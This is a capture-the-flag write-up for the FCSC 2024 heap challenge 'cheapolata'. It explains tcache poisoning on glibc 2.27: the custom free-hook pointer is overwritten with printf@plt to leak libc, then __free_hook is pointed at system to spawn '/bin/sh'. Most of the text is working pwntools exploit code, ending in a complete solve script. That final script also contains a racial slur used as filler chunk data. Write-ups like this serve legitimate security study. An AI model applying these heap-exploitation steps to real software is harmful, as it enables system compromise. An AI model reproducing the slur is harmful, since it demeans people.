---
layout: default
title: "FCSC 2024 - cheapolata"
category: "pwn - medium"
tags: [x86_64, heap, tcache, "glibc-2.27"]
date: 2026-09-10
---

this challenge runs on glibc-2.27, double free protection and safe-linking are non-existent in this version, the challenge's source code is provided
the challenge implements its own libc `__free_hook` wrapper for "safety" but the wrapper trusts a plain global variable (`old_free_hook`) that lives on attacker-writable memory
firstly, we corrupt the tcache freelist to get an allocation landing directly on `old_free_hook`, and overwrite it with `printf@plt`, `free()` on a chunk containing `"%25$p"`

```python
old_free_hook = elf.sym['old_free_hook']
printf_plt = elf.plt['printf']
__free_hook = elf.sym['__free_hook']

malloc(b'20', b'chunk0')
free()
free()

malloc(b'30', b'chunk1')
free()
free()

malloc(b'20', p64(old_free_hook))
malloc(b'20', b'dummy')
malloc(b'20', p64(printf_plt))
malloc(b'20', b'%25$p')
free()
```


now the program's hook-restoration logic installs `__free_hook = old_free_hook` (now `printf@plt`) right before calling the real `free()`, so `free()` ends up calling `printf("%25$p")` on our data. this leaks a libc stack value which we use to calculate the libc base
```c
#define MAX_FREE         6
#define MAX_FREE_SIZE 0x40

void *a;   // single global pointer — every alloc/free acts on this

static void free_hook(void *ptr, const void *caller);
static void (*old_free_hook)(void *ptr, const void *caller);

static __attribute__ ((constructor)) void
init_hook(void)
{
    old_free_hook = __free_hook;
    __free_hook = free_hook;
}

static void
free_hook(void *ptr, const void *caller)
{
    size_t size = chunksize(mem2chunk(ptr));

    __free_hook = old_free_hook;

    if (size < MAX_FREE_SIZE) {
        free(ptr);
    } else {
        errExit("free error: too large");
    }

    old_free_hook = __free_hook;
    __free_hook = free_hook;
}
```

```python
libc_start_main = int(io.recvuntil(b"==", drop=True), 0) 
libc.address = libc_start_main - 621607
log.info(f'libc base: {hex(libc.address)}')
```

we now repeat the same tcache-poisoning primitive against the real `__free_hook`, overwriting it directly with `system@libc` 
allocate a chunk containing "/bin/sh" and free it → `system("/bin/sh")`

```python
malloc(b"30", p64(__free_hook))
malloc(b"30", b"dummy2")
malloc(b"30", p64(system))

malloc(b"20", b"/bin/sh")

free()
```
    

we then construct the final solve script to exploit the binary:


```python
from pwn import *

context.log_level = 'debug'

elf = ELF('./cheapolata')
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process([ld.path, elf.path], env={'LD_PRELOAD': libc.path})

def malloc(size, data):
    io.sendlineafter(b'>>> ', b'1')
    io.sendlineafter(b'Size: ', size)
    io.sendlineafter(b'Content: ', data)

def free():
    io.sendlineafter(b'>>> ', b'2')

old_free_hook = elf.sym['old_free_hook']
printf_plt = elf.plt['printf']
__free_hook = elf.sym['__free_hook']

malloc(b'20', b'chunk0')
free()
free()

malloc(b'30', b'chunk1')
free()
free()

malloc(b'20', p64(old_free_hook))
malloc(b'20', b'dummy')
malloc(b'20', p64(printf_plt))
malloc(b'20', b'%25$p')
free()

libc_start_main = int(io.recvuntil(b"==", drop=True), 0) 
libc.address = libc_start_main - 621607
log.info(f'libc base: {hex(libc.address)}')

system = libc.sym.system

malloc(b"30", p64(__free_hook))
malloc(b"30", b"nigga2")
malloc(b"30", p64(system))

malloc(b"20", b"/bin/sh")

free()

io.interactive()
```
